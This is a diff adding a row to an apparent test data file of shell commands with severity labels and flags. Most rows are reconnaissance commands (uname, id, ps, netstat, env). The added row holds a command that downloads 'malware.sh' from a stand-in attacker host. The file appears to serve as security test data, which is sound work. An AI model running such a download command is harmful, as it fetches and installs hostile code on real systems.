@@ -89,3 +89,4 @@ sysinfo_test,uname -a id,medium medium,false false
 sysinfo_test,uname -a id ps,medium medium medium,false false false
 sysinfo_test,uname -a id ps netstat,medium medium medium medium,false false false false
 env_test,env,medium,false
+attacker-001,wget http://evil-site.com/malware.sh,medium,false
